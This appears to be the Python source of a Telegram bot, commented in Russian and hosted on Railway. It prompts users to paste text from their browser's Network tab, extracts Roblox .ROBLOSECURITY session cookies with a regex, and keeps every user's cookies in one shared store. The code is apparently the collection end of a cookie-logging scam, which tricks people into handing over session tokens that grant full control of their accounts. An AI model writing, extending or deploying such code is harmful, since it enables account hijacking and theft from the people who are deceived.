import os
import re
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask
from threading import Thread

# ========== НАСТРОЙКА ЛОГИРОВАНИЯ ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== ВЕБ-СЕРВЕР ДЛЯ RAILWAY ==========
app = Flask('')

@app.route('/')
def home():
    return "🤖 Roblox Cookie Bot is running on Railway!"

@app.route('/health')
def health():
    return "OK", 200

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# Запускаем веб-сервер в отдельном потоке
Thread(target=run_web, daemon=True).start()

# ========== ТЕЛЕГРАМ БОТ ==========
# Получаем токен из переменных окружения Railway
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    logger.error("❌ ОШИБКА: BOT_TOKEN не найден!")
    logger.info("ℹ️ Установите в Railway Dashboard: Variables → Add BOT_TOKEN")
    # Не выходим, чтобы веб-сервер продолжал работать

# Хранилище куков (в памяти)
cookies_db = []

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 *Roblox Cookie Bot*\n\n"
        "Отправьте текст из Network вкладки\n"
        "Я найду все .ROBLOSECURITY куки!\n\n"
        "📋 *Пример:*\n"
        "```\n"
        "$session.Cookies.Add((New-Object Cookie(\".ROBLOSECURITY\", \"_|WARNING...\")))\n"
        "```\n\n"
        "⚙️ *Команды:*\n"
        "/start - приветствие\n"
        "/stats - статистика",
        parse_mode='Markdown'
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_cookies = len([c for c in cookies_db if c[0] == user_id])
    
    await update.message.reply_text(
        f"📊 *Статистика:*\n"
        f"• Ваши куки: {user_cookies}\n"
        f"• Всего куков: {len(cookies_db)}\n"
        f"• Бот работает на Railway 🚀",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    
    # Ищем куки
    pattern = r'_\|WARNING[^\s"\']+'
    found = re.findall(pattern, text)
    
    if found:
        for cookie in found:
            cookies_db.append((user_id, cookie))
        
        await update.message.reply_text(
            f"✅ *Найдено {len(found)} куков!*\n\n"
            f"Всего сохранено: *{len(cookies_db)}*",
            parse_mode='Markdown'
        )
        logger.info(f"User {user_id} added {len(found)} cookies")
    else:
        await update.message.reply_text(
            "❌ *Куки не найдены!*\n\n"
            "Отправьте текст содержащий `_|WARNING`",
            parse_mode='Markdown'
        )

def main():
    if not BOT_TOKEN:
        logger.warning("⚠️ Бот не запущен (нет BOT_TOKEN), но веб-сервер работает")
        return
    
    try:
        # Создаем приложение
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Добавляем обработчики
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("stats", stats))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Запускаем бота
        logger.info("🤖 Запуск Telegram бота...")
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        logger.error(f"❌ Ошибка запуска бота: {e}")

if __name__ == '__main__':
    logger.info("🚀 Запуск приложения...")
    main()